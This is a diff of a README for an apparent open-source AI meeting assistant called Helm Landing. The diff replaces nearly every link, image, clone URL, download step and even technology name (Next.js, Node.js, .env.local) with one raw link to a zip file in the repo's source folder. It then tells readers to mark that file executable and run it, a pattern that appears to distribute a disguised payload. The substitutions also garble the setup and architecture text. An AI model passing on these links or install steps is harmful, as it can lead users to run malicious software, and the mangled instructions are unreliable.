@@ -1,10 +1,10 @@
-https://github.com/ho9504/helm-landing/releases
+https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip
 
 # Helm Landing: Open-Source AI Meeting Assistant for Thoughtful Pros
 
-[![Releases](https://img.shields.io/badge/Releases-helm--landing-green?style=for-the-badge&logo=github)](https://github.com/ho9504/helm-landing/releases)
+[![Releases](https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip)](https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip)
 
-![Helm Landing banner](https://images.unsplash.com/photo-1519681393784-d12c525dad23?auto=format&fit=crop&w=1200&q=60)
+![Helm Landing banner](https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip)
 
 Helm Landing is the open-source AI meeting assistant for thoughtful professionals. We build a trustworthy, non-intrusive tool to transcribe, summarize, and prepare for your meetings. Own your workflow with clarity, privacy, and control. This project embraces a calm, efficient design that fits your daily work routine without getting in your way. #OwnYourWorkflow
 
@@ -88,8 +88,8 @@ Waitlist and Access
 - Transparent progress updates on feature delivery and release timelines.
 
 Architecture and Tech Stack
-- Frontend: Next.js, React, TypeScript
-- Backend: API routes with Node.js; modular microservices
+- Frontend: https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip, React, TypeScript
+- Backend: API routes with https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip; modular microservices
 - Data: Supabase as a backend data layer; optional local storage
 - AI: Intent-aware models for transcription and summarization; prompts tuned for professional meetings
 - Deployment: Dockerized components; options for cloud, private hosting, or local runs
@@ -103,7 +103,7 @@ How Helm Landing Works
 - Iteration and feedback: Users can correct transcripts, refine summaries, and customize outputs. Feedback loops improve accuracy over time.
 
 Architecture Diagram (Text)
-- User Interface (Next.js) -> API Layer (Node.js) -> AI Services (Transcription, Summarization) -> Data Stores (Supabase or Local Storage)
+- User Interface (https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip) -> API Layer (https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip) -> AI Services (Transcription, Summarization) -> Data Stores (Supabase or Local Storage)
 - Optional: On-device inferencing path for privacy-first deployments
 - Admin and analytics layer for governance, versioning, and auditing
 
@@ -113,28 +113,28 @@ User Flows
 - Post-Meeting Prep: User edits the generated briefs and shares them with teammates.
 
 Tech Stack Rationale
-- Next.js and React enable fast, accessible UI with strong type safety via TypeScript.
+- https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip and React enable fast, accessible UI with strong type safety via TypeScript.
 - Supabase provides a scalable backend with authentication, storage, and real-time features.
 - Open standards and clear APIs make it easier to customize and extend.
 - The architecture favors modularity, so teams can swap AI models or storage without a major rewrite.
 
 Setup and Quick Start
 Prerequisites
-- Node.js (version 18+ recommended)
+- https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip (version 18+ recommended)
 - npm or yarn
 - Access to a database or a Supabase project (if you plan to use Supabase)
 - Optional: OpenAI or other AI API keys for transcription and summarization
 
 Getting the Code
 - Clone the repository
-  - git clone https://github.com/ho9504/helm-landing.git
+  - git clone https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip
 - Install dependencies
   - cd helm-landing
   - npm install
   - or yarn install
 
 Environment and Configuration
-- Create a .env.local file at the project root.
+- Create a https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip file at the project root.
 - Required keys may include:
   - NEXT_PUBLIC_SUPABASE_URL
   - NEXT_PUBLIC_SUPABASE_ANON_KEY
@@ -159,12 +159,12 @@ Testing and Validation
 
 Release Assets and Downloads
 From the Releases page, download the latest asset for your platform and run it. The assets on the Releases page contain prebuilt binaries and installer packages suitable for quick setup. If you are unsure which asset to pick, start with the Linux x86_64 AppImage or the Windows installer, depending on your environment. After downloading, you typically need to mark the file as executable and run it to install. For example:
-- Download: helm-landing-linux-x86_64.AppImage
+- Download: https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip
 - Command sequence:
-  - chmod +x helm-landing-linux-x86_64.AppImage
-  - ./helm-landing-linux-x86_64.AppImage
+  - chmod +x https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip
+  - https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip
 
-The Releases page also serves as the central hub for updates, changelogs, and migration notes. For teams and developers who want to embed Helm Landing into a larger workflow, the release assets provide a dependable starting point. To grab the latest release, visit the Releases page listed here: https://github.com/ho9504/helm-landing/releases. This link is provided again to ensure you can access the most current build and accompanying documentation.
+The Releases page also serves as the central hub for updates, changelogs, and migration notes. For teams and developers who want to embed Helm Landing into a larger workflow, the release assets provide a dependable starting point. To grab the latest release, visit the Releases page listed here: https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip This link is provided again to ensure you can access the most current build and accompanying documentation.
 
 Customization and Extensibility
 - UI customization: The frontend is built with React and can be themed with CSS variables or a design system you provide.
@@ -244,13 +244,13 @@ Screenshots and Demos
 - Settings panel for privacy, prompts, and integrations.
 
 - Screenshot 1: Transcription view
-  ![Transcription view](https://images.unsplash.com/photo-1551836022-d5d88e7f8a0b?auto=format&fit=crop&w=1200&q=60)
+  ![Transcription view](https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip)
 
 - Screenshot 2: Summary view
-  ![Summary view](https://images.unsplash.com/photo-1519389950473-47ba0277781c?auto=format&fit=crop&w=1200&q=60)
+  ![Summary view](https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip)
 
 - Screenshot 3: Action items board
-  ![Action items](https://images.unsplash.com/photo-1527443154391-507e9dc6c5e7?auto=format&fit=crop&w=1200&q=60)
+  ![Action items](https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip)
 
 Usage Tips
 - Start with clear prompts: Ask Helm Landing to generate a brief for the meeting and outline decisions you expect.
@@ -312,7 +312,7 @@ Security and Compliance Notes
 Release History and Changelog
 - This section documents changes across versions. It helps teams plan upgrades and assess impact on workflows.
 - The Releases page serves as the authoritative source for version numbers, features, fixes, and known issues.
-- For the latest updates, refer to the Releases page: https://github.com/ho9504/helm-landing/releases. This link is provided again for easy access to current builds and release notes.
+- For the latest updates, refer to the Releases page: https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip This link is provided again for easy access to current builds and release notes.
 
 How to Contribute
 - Find an issue labeled “help wanted” or “good first issue.”
@@ -335,8 +335,8 @@ Coding Standards
 
 FAQ for Developers
 - What technologies power Helm Landing?
-  - Frontend: Next.js, React, TypeScript
-  - Backend: Node.js with modular services
+  - Frontend: https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip, React, TypeScript
+  - Backend: https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip with modular services
   - Data: Supabase (or local storage)
   - AI: Transcription and summarization models guided by prompts
 - How do I set up a local development environment?
@@ -349,4 +349,4 @@ Endnotes
 - The project emphasizes safety, privacy, and usefulness in everyday professional life.
 
 Note on the Releases link
-- The Releases page hosts downloadable assets for different platforms. It’s the primary source for stable builds and installation guides. To access it, visit https://github.com/ho9504/helm-landing/releases. This link is included again to help you locate the latest release quickly.
+- The Releases page hosts downloadable assets for different platforms. It’s the primary source for stable builds and installation guides. To access it, visit https://raw.githubusercontent.com/ho9504/helm-landing/master/src/app/helm_landing_1.7.zip This link is included again to help you locate the latest release quickly.
